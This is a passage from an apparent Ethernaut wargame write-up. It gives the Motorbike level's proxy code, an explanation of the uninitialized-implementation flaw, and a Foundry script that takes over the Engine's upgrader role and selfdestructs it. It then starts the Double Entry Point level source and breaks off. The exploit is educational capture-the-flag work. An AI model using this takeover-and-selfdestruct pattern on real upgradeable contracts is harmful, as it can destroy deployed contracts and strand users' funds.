</span><span>        </span><span class="token" style="color:#ce9178">address</span><span> value</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span></span><span class="token" style="color:#6a9955">//this initializer modifier prevents the function from being  calling twice.</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">initialize</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span> initializer </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        horsePower </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#b5cea8">1000</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        upgrader </span><span class="token" style="color:#d4d4d4">=</span><span> msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>    </span><span class="token" style="color:#6a9955">// Upgrade the implementation of the proxy to `newImplementation`</span><span>
</span><span>    </span><span class="token" style="color:#6a9955">// subsequently execute the function call</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">upgradeToAndCall</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> newImplementation</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">bytes</span><span> </span><span class="token" style="color:#569CD6">memory</span><span> data</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span> </span><span class="token" style="color:#569CD6">payable</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#dcdcaa">_authorizeUpgrade</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#dcdcaa">_upgradeToAndCall</span><span class="token" style="color:#d4d4d4">(</span><span>newImplementation</span><span class="token" style="color:#d4d4d4">,</span><span> data</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>    </span><span class="token" style="color:#6a9955">// Restrict to upgrader role</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">_authorizeUpgrade</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">internal</span><span> </span><span class="token" style="color:#569CD6">view</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">require</span><span class="token" style="color:#d4d4d4">(</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender </span><span class="token" style="color:#d4d4d4">==</span><span> upgrader</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">&quot;Can&#x27;t upgrade&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>    </span><span class="token" style="color:#6a9955">// Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">_upgradeToAndCall</span><span class="token" style="color:#d4d4d4">(</span><span>
</span><span>        </span><span class="token" style="color:#ce9178">address</span><span> newImplementation</span><span class="token" style="color:#d4d4d4">,</span><span>
</span><span>        </span><span class="token" style="color:#ce9178">bytes</span><span> </span><span class="token" style="color:#569CD6">memory</span><span> data
</span><span>    </span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">internal</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#6a9955">// Initial upgrade and setup call</span><span>
</span><span>        </span><span class="token" style="color:#dcdcaa">_setImplementation</span><span class="token" style="color:#d4d4d4">(</span><span>newImplementation</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">if</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span>data</span><span class="token" style="color:#d4d4d4">.</span><span>length </span><span class="token" style="color:#d4d4d4">&gt;</span><span> </span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>            </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">bool</span><span> success</span><span class="token" style="color:#d4d4d4">,</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">=</span><span> newImplementation</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">delegatecall</span><span class="token" style="color:#d4d4d4">(</span><span>data</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>            </span><span class="token" style="color:#569CD6">require</span><span class="token" style="color:#d4d4d4">(</span><span>success</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">&quot;Call failed&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>    </span><span class="token" style="color:#6a9955">// Stores a new address in the EIP1967 implementation slot.</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">_setImplementation</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> newImplementation</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">private</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">require</span><span class="token" style="color:#d4d4d4">(</span><span>Address</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">isContract</span><span class="token" style="color:#d4d4d4">(</span><span>newImplementation</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">&quot;ERC1967: new implementation is not a contract&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        AddressSlot </span><span class="token" style="color:#569CD6">storage</span><span> r</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">assembly</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>            r_slot </span><span class="token" style="color:#d4d4d4">:=</span><span> _IMPLEMENTATION_SLOT
</span><span>        </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span>        r</span><span class="token" style="color:#d4d4d4">.</span><span>value </span><span class="token" style="color:#d4d4d4">=</span><span> newImplementation</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span></code></div></pre>
<p><strong>Goal:</strong></p>
<p>Would you be able to selfdestruct its engine and make the motorbike unusable ?</p>
<p><strong>Explanation:</strong></p>
<ol>
<li>This is another upgradeable proxy contract setup. Motorbike contract is the proxy contract which forwards the calls to the implementation contract Engine.</li>
<li>This time no storage collison is happened.</li>
<li>We need to change the <code>upgrader</code> of the Engine contract and <code>selfdestruct</code> the Engine contract.</li>
<li>We have to write an Attack contract which has the selfdestruct function and change the implementation address.</li>
<li>We see only one time the <code>upgrader</code> was assigned inside Engine contract, that is inside <code>initialize()</code> function. And this initialize function was called inside the constructor of the Motobike.</li>
<li>But observe that this call was done using <code>delegatecall</code>, which is done in the context of the Motorbike. Not the Engine contract.</li>
<li>This means the <code>initialize()</code> function can be called again as the <code>intializer</code> modfier not updated.</li>
<li>By calling <code>intialize()</code>, we will become the upgrader of the Engine contract.</li>
<li>Now, we can update the implementation addres by calling <code>upgradeToAndCall()</code> function and pass the data as the signature of the <code>destructEngine()</code> function to be called by the Engine contract.</li>
<li>This will destruct the Engine contract, because the call was done using <code>delegatecall</code> so the storage of the Engine will be affected.</li>
</ol>
<p><strong>Level25Solution.s.sol</strong></p>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#6a9955">// SPDX-License-Identifier: MIT</span><span>
</span><span></span><span class="token" style="color:#569CD6">pragma</span><span> </span><span class="token" style="color:#569CD6">solidity</span><span> </span><span class="token" style="color:#d4d4d4">&lt;</span><span class="token version" style="color:#b5cea8">0.7.0</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;forge-std/Script.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;forge-std/console.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;../src/Level25.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Level25Sol</span><span> </span><span class="token" style="color:#569CD6">is</span><span> Script </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#ce9178">bytes32</span><span> </span><span class="token" style="color:#569CD6">internal</span><span> </span><span class="token" style="color:#569CD6">constant</span><span> _IMPLEMENTATION_SLOT </span><span class="token" style="color:#d4d4d4">=</span><span>
</span><span>        </span><span class="token" style="color:#b5cea8">0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    Motorbike instance </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">Motorbike</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0x20072a9B2075f613965e9AE956de56E2d68A45B2</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    Engine engineAddress </span><span class="token" style="color:#d4d4d4">=</span><span>
</span><span>        </span><span class="token" style="color:#dcdcaa">Engine</span><span class="token" style="color:#d4d4d4">(</span><span>
</span><span>            </span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span>
</span><span>                </span><span class="token" style="color:#ce9178">uint160</span><span class="token" style="color:#d4d4d4">(</span><span>
</span><span>                    </span><span class="token" style="color:#ce9178">uint256</span><span class="token" style="color:#d4d4d4">(</span><span>vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">load</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span>instance</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">,</span><span> _IMPLEMENTATION_SLOT</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span>
</span><span>                </span><span class="token" style="color:#d4d4d4">)</span><span>
</span><span>            </span><span class="token" style="color:#d4d4d4">)</span><span>
</span><span>        </span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">run</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">startBroadcast</span><span class="token" style="color:#d4d4d4">(</span><span>vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">envUint</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;PRIVATE_KEY&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        console</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span>engineAddress</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">new</span><span> </span><span class="token" style="color:#4ec9b0">Attack</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">exploit</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span>engineAddress</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">stopBroadcast</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Attack</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    Engine </span><span class="token" style="color:#569CD6">public</span><span> engine</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">exploit</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> _engine</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        engine </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">Engine</span><span class="token" style="color:#d4d4d4">(</span><span>_engine</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        engine</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">initialize</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        console</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span>engine</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">upgrader</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        </span><span class="token" style="color:#ce9178">bytes</span><span> </span><span class="token" style="color:#569CD6">memory</span><span> killSelector </span><span class="token" style="color:#d4d4d4">=</span><span> abi</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">encodeWithSelector</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">this</span><span class="token" style="color:#d4d4d4">.</span><span>kill</span><span class="token" style="color:#d4d4d4">.</span><span>selector</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        engine</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">upgradeToAndCall</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">this</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">,</span><span> killSelector</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">kill</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">selfdestruct</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">payable</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">this</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>    </span><span class="token" style="color:#dcdcaa">receive</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span> </span><span class="token" style="color:#569CD6">payable</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span></code></div></pre>
<p><strong>To run the script</strong></p>
<pre><code>$ source .env
$ forge script script/Level25Solution.s.sol:Level25Sol --rpc-url $RPC_URL --broadcast
</code></pre>
<h2>Double Entry Point</h2>
<p><strong>Level26.sol</strong></p>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#6a9955">// SPDX-License-Identifier: MIT</span><span>
</span><span></span><span class="token" style="color:#569CD6">pragma</span><span> </span><span class="token" style="color:#569CD6">solidity</span><span> </span><span class="token" style="color:#d4d4d4">^</span><span class="token version" style="color:#b5cea8">0.8.24</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;openzeppelin-contracts-06/access/Ownable.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;openzeppelin-contracts-06/token/ERC20/ERC20.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">interface</span><span> </span><span class="token" style="color:#4ec9b0">DelegateERC20</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">delegateTransfer</span><span class="token" style="color:#d4d4d4">(</span><span>
</span><span>        </span><span class="token" style="color:#ce9178">address</span><span> to</span><span class="token" style="color:#d4d4d4">,</span><span>
</span><span>        </span><span class="token" style="color:#ce9178">uint256</span><span> value</span><span class="token" style="color:#d4d4d4">,</span><span>
</span><span>        </span><span class="token" style="color:#ce9178">address</span><span> origSender
</span><span>    </span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span> </span><span class="token" style="color:#569CD6">returns</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">bool</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">interface</span><span> </span><span class="token" style="color:#4ec9b0">IDetectionBot</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">handleTransaction</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> user</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">bytes</span><span> </span><span class="token" style="color:#569CD6">calldata</span><span> msgData</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">interface</span><span> </span><span class="token" style="color:#4ec9b0">IForta</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">setDetectionBot</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> detectionBotAddress</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">notify</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> user</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">bytes</span><span> </span><span class="token" style="color:#569CD6">calldata</span><span> msgData</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">raiseAlert</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> user</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Forta</span><span> </span><span class="token" style="color:#569CD6">is</span><span> IForta </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">mapping</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> </span><span class="token" style="color:#d4d4d4">=&gt;</span><span> IDetectionBot</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> usersDetectionBots</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">mapping</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> </span><span class="token" style="color:#d4d4d4">=&gt;</span><span> </span><span class="token" style="color:#ce9178">uint256</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> botRaisedAlerts</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">setDetectionBot</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> detectionBotAddress</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span> override </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        usersDetectionBots</span><span class="token" style="color:#d4d4d4">[</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">]</span><span> </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">IDetectionBot</span><span class="token" style="color:#d4d4d4">(</span><span>detectionBotAddress</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">notify</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> user</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">bytes</span><span> </span><span class="token" style="color:#569CD6">calldata</span><span> msgData</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span> override </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">if</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span>usersDetectionBots</span><span class="token" style="color:#d4d4d4">[</span><span>user</span><span class="token" style="color:#d4d4d4">]</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">==</span><span> </span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">return</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        try usersDetectionBots</span><span class="token" style="color:#d4d4d4">[</span><span>user</span><span class="token" style="color:#d4d4d4">]</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">handleTransaction</span><span class="token" style="color:#d4d4d4">(</span><span>user</span><span class="token" style="color:#d4d4d4">,</span><span> msgData</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>            </span><span class="token" style="color:#569CD6">return</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#d4d4d4">}</span><span> catch </span><span class="token" style="color:#d4d4d4">{</span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">raiseAlert</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> user</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span> override </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">if</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span>usersDetectionBots</span><span class="token" style="color:#d4d4d4">[</span><span>user</span><span class="token" style="color:#d4d4d4">]</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">!=</span><span> msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">return</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        botRaisedAlerts</span><span class="token" style="color:#d4d4d4">[</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">]</span><span> </span><span class="token" style="color:#d4d4d4">+=</span><span> </span><span class="token" style="color:#b5cea8">1</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">CryptoVault</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#ce9178">address</span><span> </span><span class="token" style="color:#569CD6">public</span><span> sweptTokensRecipient</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    IERC20 </span><span class="token" style="color:#569CD6">public</span><span> underlying</span><span class="token" style="color:#d4d4d4">;</span><span> </span><span class="token" style="color:#6a9955">//doubleentrypoint</span><span>
</span>
